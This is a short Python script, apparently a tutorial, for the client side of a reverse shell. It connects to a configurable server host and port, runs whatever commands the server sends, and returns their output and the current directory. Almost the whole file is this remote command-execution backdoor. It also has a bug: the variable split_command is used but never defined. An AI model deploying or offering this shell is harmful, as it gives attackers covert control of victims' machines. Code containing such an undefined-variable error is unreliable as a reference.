# Writin' the client side shell
import socket
import os
import subprocess
import sys

server_host = "127.0.0.1" #normally sys.argv[1]
server_port = 5003
buffer_size = 1024 * 128 #128 kB max size buffer
#seperator string for multiple messages
seperator = "<sep>"

#the above commented code for sys.argv lets the server host IP to be passed from command line args
#temporarily set to 127.0.0.1 to test both sides on one machine
#port number is currently set to TCP but can be changed to any number (80, for example)
#so long as the host program has the same listening port

#create the socket object:
s = socket.socket()
#connect to the server
s.connect((server_host, server_port))

#server expects the cwd upon connection, so we need to get cwd
cwd = os.getcwd()
s.send(cwd.encode())

#initiate main loop to execute commands from the server

while True:
    #receive command from the host server
    command = s.recv(buffer_size).decode()
    if command.lower() == "exit":
        #if command is exit, break
        break
    if split_command[0].lower() == "cd":
        #cd command is change directory
        try:
            os.chdir(' '.join(split_command[1:]))
        except FileNotFoundError as e:
            #if there's an error, send the error message as output to the host
            output = str(e)
        else:
            #if operation is successful, write success message
            output = "Directory change successful!"
    else:
        #execute the command and retrieve the results
        output = subprocess.getoutput(command)
    #get the current working directory as output
    cwd = os.getcwd()
    #send results back to the server
    message = f"{output}{seperator}{cwd}"
    s.send(message.encode())
#close client connection
s.close()

